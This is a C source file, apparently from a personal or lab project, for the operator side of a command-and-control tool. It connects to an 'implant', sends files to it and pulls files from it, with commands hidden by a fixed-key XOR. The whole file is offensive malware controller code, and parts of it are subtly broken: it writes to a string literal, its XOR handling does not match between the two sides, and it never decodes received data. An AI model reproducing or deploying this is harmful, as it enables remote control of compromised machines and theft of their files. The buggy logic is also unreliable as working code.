//C2 code (based off of personal project)
#include <arpa/inet.h> // inet_addr()
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h> // bzero()
#include <sys/socket.h>
#include <unistd.h> // read(), write(), close()
#include <pthread.h>
#include <dirent.h> // Required for directory operations for files

#define MAX 600
#define PORT 8080
#define SA struct sockaddr

void options(int sockfd);

// Taken from Geeks for Geeks
void* encryptDecrypt(char *inpString) 
{ 
    // Define XOR key 
    // Any character value will work 
    char xorKey = 'P'; 
  
    // calculate length of input string 
    int len = strlen(inpString); 
  
    // perform XOR operation of key 
    // with every character in string 
    for (int i = 0; i < len; i++) 
    { 
        inpString[i] = inpString[i] ^ xorKey; 
        printf("%c",inpString[i]); 
    }
}

void *send_file(void *sockfd_ptr) {
    int sockfd = *((int *)sockfd_ptr);
    char buffer[MAX];
    char file_name[MAX];
    char file_path[MAX];

    printf("Enter the name of the file to send: ");
    scanf("%s", file_name);

    snprintf(file_path, sizeof(file_path), "<define folder here>/%s", file_name); 
    FILE *file = fopen(file_path, "rb");
    if (file == NULL) {
        printf("File not found: %s\n", file_path);
        return NULL;
    }

    // Send "SEND_FILE" command with file name
    snprintf(buffer, sizeof(buffer), "SEND_FILE %s", file_name);
    encryptDecrypt(buffer);
    write(sockfd, buffer, strlen(buffer));

    // Wait for acknowledgment
    bzero(buffer, sizeof(buffer));
    read(sockfd, buffer, sizeof(buffer));
    encryptDecrypt(buffer);
    if (strncmp(buffer, "ACK", 3) != 0) {
        printf("Server did not acknowledge file name.\n");
        fclose(file);
        return NULL;
    }

    // Send file contents
    while (!feof(file)) {
        int bytes_read = fread(buffer, 1, sizeof(buffer), file);
        write(sockfd, buffer, bytes_read);
    }

    // Inform server of end of file transfer
    
    char * encrypted_EOF = "EOF";
    encryptDecrypt(encrypted_EOF);
    write(sockfd, encrypted_EOF, 4);
    fclose(file);

    printf("File sent successfully.\n");
    return NULL;
}



void *receive_file_from_server(void *sockfd_ptr) {
    int sockfd = *((int *)sockfd_ptr);
    char buffer[MAX];
    char file_name[MAX];
    char file_path[MAX];

    printf("Enter the name of the file to receive: ");
    scanf("%s", file_name);

    snprintf(buffer, sizeof(buffer), "RECV_FILE %s", file_name);
    encryptDecrypt(buffer);
    write(sockfd, buffer, strlen(buffer));

    snprintf(file_path, sizeof(file_path),"%s", file_name);
    FILE *file = fopen(file_path, "wb");
    if (file == NULL) {
        printf("Could not create file.\n");
        return NULL;
    }

    while (1) {
        bzero(buffer, sizeof(buffer));
        int bytes_read = read(sockfd, buffer, sizeof(buffer));
        if (bytes_read < 0) {
            perror("Failed to read from socket");
            break;
        }

        if (bytes_read == 0 || (bytes_read == 3 && strncmp(buffer, "EOF", 3) == 0)) {
            printf("End of file received.\n");
            break;
        }

        fwrite(buffer, 1, bytes_read, file);
        printf("Received %d bytes from server.\n", bytes_read);
    }

    fclose(file);
    printf("File %s received successfully.\n", file_name);
    return NULL;
}


void options(int sockfd) {
    pthread_t recv_thread, send_thread, file_send_thread, file_request_thread, file_list_thread; //Threads needed for chatroom functions, sending files to server, and accessing files from server
    int choice;

    while (1) {
        printf("Select an option:\n");  
        printf("1. Send File\n");
        printf("2. Receive File\n");
        printf("3. Exit\n");
        scanf("%d", &choice);

        while (getchar() != '\n'); //Prevents issues with newlines affecting inputs

        switch (choice) {
           

            case 1: // send file to implant
                pthread_create(&file_send_thread, NULL, send_file, &sockfd);
                pthread_join(file_send_thread, NULL);
                break;           

            case 2: // Receive a file from the implant
                pthread_create(&file_request_thread, NULL, receive_file_from_server, &sockfd);  
                pthread_join(file_request_thread, NULL);
                break;

            case 3: // Exit Program
                write(sockfd, "EXIT", strlen("EXIT"));
                close(sockfd);  
                exit(0);  

            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
}

void start_chatroom_clientside(const char* server_ip, int port)
{
    int sockfd, choice;
    struct sockaddr_in servaddr;

    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");

    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET; // IPV4 address
    servaddr.sin_addr.s_addr = inet_addr(server_ip);
    servaddr.sin_port = htons(port);

    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");

    options(sockfd);
}

int main() {
    start_chatroom_clientside("127.0.0.1", PORT); // COnnect to implant (address for the vm i used where implant was stored was 10.0.0.86)
    return 0;
} 
